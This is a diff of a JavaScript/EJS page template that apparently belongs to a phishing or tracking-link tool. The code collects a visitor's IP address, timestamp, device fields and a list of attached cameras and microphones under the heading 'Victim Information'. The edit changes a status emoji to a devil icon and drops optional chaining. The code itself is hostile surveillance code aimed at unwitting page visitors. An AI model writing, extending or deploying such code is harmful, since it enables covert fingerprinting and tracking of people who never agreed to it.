@@ -75,7 +75,7 @@ var c=false,l=false,uid="<%=uid %>";
 async function gather(){
 var td="";
 <% if(!t){ %>
-td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+td += '<code>😈Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
 <% }else{ %>
 await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
 
@@ -95,9 +95,9 @@ td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
 
 
 
-if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
+if (navigator.mediaDevices || navigator.mediaDevices.enumerateDevices) {
 /////List cameras and microphones.
-await navigator.mediaDevices?.enumerateDevices()
+await navigator.mediaDevices.enumerateDevices()
 .then(function(devices) {
 td+="<br><b>📷 Media Device Information</b><br>";
 devices.forEach(function(device) {
